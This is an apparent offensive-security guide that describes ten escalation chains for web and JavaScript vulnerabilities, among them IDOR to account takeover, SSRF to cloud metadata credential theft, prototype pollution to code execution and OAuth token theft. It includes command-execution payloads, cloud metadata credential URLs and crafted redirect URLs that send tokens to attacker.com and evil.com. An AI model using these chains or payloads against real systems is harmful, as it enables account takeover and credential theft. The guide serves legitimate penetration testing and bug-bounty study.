# Vulnerability Escalation Guide

This guide outlines common escalation chains to maximize the impact of vulnerabilities discovered during JavaScript code analysis.

## 1. IDOR to Account Takeover (ATO)

**Description:** Escalating an Insecure Direct Object Reference (IDOR) in a sensitive endpoint to gain full control over another user's account.

### Escalation Steps:
1. **Identify IDOR:** Find an endpoint that allows modifying user data (e.g., `PUT /api/v1/user/profile`).
2. **Test for IDOR:** Change the `user_id` or `email` in the request to a target user's ID.
3. **Escalate to ATO:**
    - Change the target user's email address to one you control.
    - Trigger a "Forgot Password" flow.
    - Receive the reset link on your controlled email.
    - Reset the password and log in as the target user.

### Impact Multiplier:
- **Initial:** Medium (Data Leakage/Modification)
- **Escalated:** Critical (Full Account Takeover)

---

## 2. XSS to Remote Code Execution (RCE)

**Description:** Using Cross-Site Scripting (XSS) in a desktop application (Electron) or a server-side rendering (SSR) context to achieve RCE.

### Escalation Steps (Electron Example):
1. **Identify XSS:** Find an injection point in the application UI.
2. **Check Context:** Determine if `nodeIntegration` is enabled or if a `preload` script exposes dangerous APIs.
3. **Payload:**
   ```javascript
   <script>
     require('child_process').exec('calc'); // Simple RCE test
   </script>
   ```
4. **Advanced (React2Shell - CVE-2025-66478):** Leverage specific React hydration vulnerabilities to execute code in the context of the server or client.

### Impact Multiplier:
- **Initial:** Medium/High (Session Hijacking)
- **Escalated:** Critical (Full System Compromise)

---

## 3. SSRF to Cloud Metadata Access

**Description:** Escalating Server-Side Request Forgery (SSRF) to extract sensitive credentials from cloud infrastructure metadata services.

### Escalation Steps:
1. **Identify SSRF:** Find a parameter that fetches external resources (e.g., `?url=http://example.com`).
2. **Target Metadata Service:**
    - **AWS:** `http://169.254.169.254/latest/meta-data/iam/security-credentials/[role-name]`
    - **GCP:** `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` (Requires `Metadata-Flavor: Google` header)
    - **Azure:** `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/`
3. **Extract Credentials:** Use the returned JSON to obtain AccessKeyId, SecretAccessKey, and Token.

### Impact Multiplier:
- **Initial:** Medium (Internal Port Scanning)
- **Escalated:** Critical (Cloud Infrastructure Access)

---

## 4. Prototype Pollution to RCE

**Description:** Exploiting Prototype Pollution to overwrite global object properties that are later used in dangerous functions like `eval`, `child_process.exec`, or template engines.

### Escalation Steps:
1. **Identify Prototype Pollution:** Find an object merge/clone operation vulnerable to `__proto__` injection.
2. **Find a Gadget:** Identify a library or internal code that uses a property from the prototype in a dangerous way.
3. **Payload (Lodash/Handlebars Example):**
   ```javascript
   // Pollute the prototype
   Object.prototype.shell = "node -e 'require(\"child_process\").execSync(\"touch /tmp/pwned\")'";
   // Trigger the gadget (e.g., a template engine that uses 'shell' property)
   ```
4. **Execute:** The polluted property is used by the application logic to execute arbitrary commands.

### Impact Multiplier:
- **Initial:** Medium (Denial of Service)
- **Escalated:** Critical (Remote Code Execution)

---

## 5. Open Redirect to OAuth Token Hijacking

**Description:** Using an Open Redirect vulnerability to steal OAuth 2.0 authorization codes or access tokens.

### Escalation Steps:
1. **Identify Open Redirect:** Find a parameter that redirects users (e.g., `?next=/dashboard`).
2. **Identify OAuth Flow:** Find an OAuth authorization endpoint (e.g., `/oauth/authorize`).
3. **Chain the Vulnerability:**
    - Craft a URL where the `redirect_uri` points to a legitimate but vulnerable endpoint with an Open Redirect.
    - `https://auth.example.com/authorize?client_id=123&redirect_uri=https://app.example.com/callback?next=https://attacker.com`
4. **Steal Token:** When the user authorizes, the code/token is sent to `app.example.com`, which then redirects it to `attacker.com` via the Open Redirect.

### Impact Multiplier:
- **Initial:** Low (Phishing)
- **Escalated:** High/Critical (Account Access via OAuth)

---

## 6. PostMessage → OAuth Token Theft

**Description:** Exploiting insufficient postMessage origin validation to hijack OAuth flows and steal access tokens or authorization codes.

### Escalation Steps:
1. **Identify PostMessage handler:** Find `addEventListener("message"` in target application or embedded SDK.
2. **Analyze origin validation:** Check if `event.origin` is validated against a strict allowlist. Common bypasses:
   - Regex with unescaped dot: `/.*facebook.com$/` matches `evilfacebook.com`
   - Domain-only check without message structure validation
   - Inverted `isSameOrigin` check (trusted object called on untrusted input)
3. **Exploit the handler:**
   - If handler constructs OAuth requests from message data → inject attacker-controlled `redirect_uri`
   - If handler sets `innerHTML`/`document.write` from message data → XSS on target domain
   - If handler stores `event.origin` as trusted host → inject script loading from attacker origin
4. **Steal token:** Intercept OAuth callback, read token from URL fragment or postMessage response.

### Real-world chains:
- Sandboxed iframe (`origin: "null"`) bypasses inverted origin checks
- `Math.random()` PRNG prediction (4+ samples + Z3 solver) to forge cross-window auth tokens
- MessageChannel port hijack → request OAuth dialog URL → steal `state` parameter

### Impact Multiplier:
- **Initial:** Medium (Cross-Origin Message Injection)
- **Escalated:** Critical (Account Takeover via OAuth Token Theft)

---

## 7. Client-Side Path Traversal → CSRF (CSPT2CSRF)

**Description:** Exploiting user input in fetch/XHR URL path segments to redirect API requests to unintended endpoints, achieving CSRF that bypasses SameSite cookie protections.

### Escalation Steps:
1. **Identify CSPT:** Find `fetch('/api/' + userInput)` or `` fetch(`/api/${param}/data`) `` where `userInput` comes from URL hash, query params, or database.
2. **Test path traversal:** Inject `../../../target-endpoint` as the user input.
3. **Chain GET → POST:**
   - GET CSPT to leak JSON containing a CSRF token or resource ID
   - Feed that token/ID into a POST CSPT to perform state-changing action
4. **Bypass SameSite:** Since the request originates from the application's own JavaScript (same-origin), SameSite cookies are included automatically.

### Impact Multiplier:
- **Initial:** Low (Unintended API Call)
- **Escalated:** High (State-Changing CSRF Bypassing SameSite)

---

## 8. Login CSRF → Attack Chain Enabler

**Description:** Using Login CSRF to force a victim into an attacker-controlled session, then exploiting subsequent OAuth or account-linking flows.

### Escalation Steps:
1. **Identify Login CSRF:** Find login endpoint without CSRF token protection.
2. **Force victim into attacker session:** Submit login form with attacker credentials from victim's browser.
3. **Exploit the session:**
   - Trigger OAuth flow → authorization code redirects to attacker's configured callback
   - Trigger account-linking → victim's external account linked to attacker's internal account
   - Trigger sensitive page load → URL containing victim data readable by attacker's session context
4. **Chain with Self-XSS:** If a self-XSS exists in the account, Login CSRF makes it exploitable against other users.

### Impact Multiplier:
- **Initial:** Low (Session Manipulation)
- **Escalated:** Critical (Account Takeover via OAuth Code Theft or Account Linking)

---

## 9. Open Redirect → FXAuth/SSO Token Theft

**Description:** Chaining open redirects on trusted domains to steal SSO tokens, authentication blobs, or OAuth codes that are passed in URL parameters during redirect flows.

### Escalation Steps:
1. **Identify SSO/FXAuth flow:** Find authentication redirect that carries `token`, `blob`, `code`, or `signed_request` in URL parameters.
2. **Find redirect_uri bypass:**
   - Path traversal: `redirect_uri=/callback/../../open_redirect?next=evil.com`
   - `startsWith` check bypass: `redirect_uri=https://trusted.com.evil.com`
   - Double URL encoding: `%252F..%252F` to bypass path normalization
   - App namespace abuse: `apps.trusted.com/{attacker_app_namespace}` as redirect target
3. **Capture token:** Attacker's server receives the authentication token/code via the redirect chain.

### Impact Multiplier:
- **Initial:** Low (Open Redirect / Phishing)
- **Escalated:** Critical (SSO Token Theft → Account Takeover on Multiple Services)

---

## 10. Supply-Chain Stored XSS via Shared Scripts

**Description:** Injecting malicious JavaScript into globally-served analytics/pixel scripts by exploiting server-side code generation that concatenates user-controlled values without escaping.

### Escalation Steps:
1. **Identify shared script:** Find analytics/pixel/SDK scripts loaded across multiple domains (e.g., `fbevents.js`, analytics gateways).
2. **Find injection point:** Locate server-side code that generates the script content by concatenating user-controlled values (domain_uri, event configs, pixel settings).
3. **Inject payload:** Break out of string context (e.g., `"]}` closes JSON structure) and inject arbitrary JavaScript.
4. **Impact:** Payload executes on EVERY website that loads the shared script — massive blast radius.

### Impact Multiplier:
- **Initial:** Medium (Stored XSS on single endpoint)
- **Escalated:** Critical (Supply-chain XSS affecting all sites using the shared script + potential ATO via cookie theft)
